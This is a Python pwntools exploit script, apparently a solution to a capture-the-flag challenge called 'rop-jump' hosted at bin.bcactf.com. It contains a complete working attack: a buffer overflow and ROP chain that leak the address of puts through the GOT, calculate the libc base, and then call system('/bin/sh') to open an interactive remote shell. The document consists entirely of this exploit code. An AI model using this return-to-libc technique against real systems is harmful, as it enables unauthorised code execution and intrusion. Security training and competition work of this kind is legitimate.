from pwn import *

context(terminal=['tmux','new-window'])

local = False
fname = 'rop-jump'

host,port = 'bin.bcactf.com',49179

p = ELF(fname)
r = process(fname) if local else remote(host,port)

libc = ELF('libc_local.so') if local else ELF('libc_remote.so') 

pop_rdi = 0x00000000004013b3
ret = 0x000000000040101a

magic = 0xe3b31 if local else 0xe6c7e
def header():
	r.recvuntil(b'jumping!')

def send_payload1():
	r.sendline(b'a'*120+p64(pop_rdi)+p64(p.got['puts'])+p64(p.plt['puts'])+p64(p.sym['_start']))

def send_payload2():
	bin_sh = next(libc.search(b'/bin/sh'))
	log.info('bin sh @ '+hex(bin_sh))
	r.sendline(b'a'*120+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(libc.sym['system']))

if __name__=='__main__':
	

	header()
	send_payload1()
	r.recvuntil(b'!\n')
	puts = r.recvline().strip()
	puts = u64(puts+b'\x00'*(8-len(puts)))
	print('puts @'+hex(puts))
	libc.address = puts - libc.sym['puts'] 	

	magic+=libc.address
	#r.recvuntil(b'!')
	header()
	#gdb.attach(r,'''
	#''')
	send_payload2()
	#puts = puts+b'\x00'*(8-len(puts))
	#puts = u64(puts)
	#log.info(hex(puts))

	r.interactive()
	
